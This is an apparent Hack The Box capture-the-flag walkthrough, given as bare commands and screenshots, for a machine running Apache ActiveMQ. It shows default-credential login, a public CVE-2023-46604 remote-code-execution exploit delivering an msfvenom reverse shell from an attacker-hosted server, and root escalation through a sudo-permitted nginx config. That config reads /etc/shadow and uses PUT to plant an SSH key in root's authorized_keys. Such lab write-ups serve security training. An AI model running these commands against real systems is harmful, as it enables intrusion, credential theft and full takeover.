![image](https://github.com/regarmulia/HTB/assets/33616880/c7ddf18e-12d7-49b9-a610-425eb09b68c8)```
nmap -sS -sC -sV -T5 -Pn 10.10.11.243
nmap -p- -T5 10.10.11.243
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1186881c-78c2-46f8-a554-1ba8d6634117)

![image](https://github.com/regarmulia/HTB/assets/33616880/2611c10e-95d7-41e1-8c74-6fcf7f6f8844)

```
10.10.11.243/
admin:admin
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4bb5ac1e-d62a-46cd-822f-3ac7bee4abc8)

![image](https://github.com/regarmulia/HTB/assets/33616880/cc45491e-7042-4a98-8622-5722631b40a6)

![image](https://github.com/regarmulia/HTB/assets/33616880/67f7a55f-3471-4f52-a062-46c83d247792)

```
activemq broker 5.15.15 exploit
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0c0635b0-741d-46c7-ad00-e4a8c7a45c99)

![image](https://github.com/regarmulia/HTB/assets/33616880/bb33149d-66eb-4c81-904e-8c31d3b0be2c)


```
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o test.elf
python3 -m http.server 8001
nc -lvvp 4444
go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/02a6e7d6-a3cd-486c-9719-80fa5efa2b77)

![image](https://github.com/regarmulia/HTB/assets/33616880/497cfa98-5b46-4748-bb90-3504ed9869d3)

![image](https://github.com/regarmulia/HTB/assets/33616880/b1fd204c-a6df-4c0c-af35-e24df116c0c3)


```
sudo -l
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b859f21c-8787-40ff-af31-430a25fb5886)

```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```
```
python3 -m http.server 80
wget 10.10.14.12/privesc.conf
sudo /usr/sbin/nginx -c /tmp/privesc.conf
curl localhost:1337/etc/shadow
curl localhost:1337/root/root.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/60e2f555-7bbc-42b3-8032-d98337503493)

![image](https://github.com/regarmulia/HTB/assets/33616880/a524f463-885a-4995-aec9-cf33583e22d3)

![image](https://github.com/regarmulia/HTB/assets/33616880/9c6fe913-03a7-4805-832b-e032bd0cb45d)

```
ssh-keygen -o
```
![image](https://github.com/regarmulia/HTB/assets/33616880/a82122f2-cf78-415b-97d9-6483aa8497af)

![image](https://github.com/regarmulia/HTB/assets/33616880/d95ac52a-f273-4a06-9b9b-45cb9d7f8cfc)

```
wget 10.10.14.12/privesc2.conf
sudo /usr/sbin/nginx -c /tmp/privesc2.conf
curl localhost:1338
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiHugqsdduKFyMsf1Q3e75saETiEWwCDHvAZfT7Ep8FPyXfSnA6ya1VSSJT34CENsFBpvEpSvqMLphMyPjtZCyjcd6fc+RRweIvzba77murxnKKymr2Pi3iEcqHgQOCSqkE++a4D2XoCcGZjxAZqCVl64xDPqlPVZoT0Eu705f7T6FM2HOqL+GHRzNYcT7fRDiZGK5fOvVKePqRuqF4Kts5IjAldwcoeHCrxyOVI7LfgtqrmcKX4EL9+RpKzYhnG/S8nDTlu1jO9Up+M2FK2oTd6BYKeirI+xC7YWIYmZiy5Fkd+GR3foWOlxdEOhKbfkVqgyA6wdbez0KwCFbftoxKtjHqSI/d/EgH+NflOKXscZ/aX9rnRBQI+SxTLCL9n68J5nQ84Z6JC6UmSW9IKrtDc7Z9ibtm1nPJqgm7xwHUPZzbflk2w3q89gIJl4MqwSZ6t19dG3k8YzVIBls9gxQ3/TiveSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
<veSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8aba9e4e-bea4-479a-a680-c37037fbc2c6)

![image](https://github.com/regarmulia/HTB/assets/33616880/d43f7977-5069-46a9-b4c3-1e80078da42a)

```
ssh -i /root/.ssh/id_rsa root@10.10.11.243
```
![image](https://github.com/regarmulia/HTB/assets/33616880/8f1a8b22-696b-42d6-9602-c32de9c16cb4)
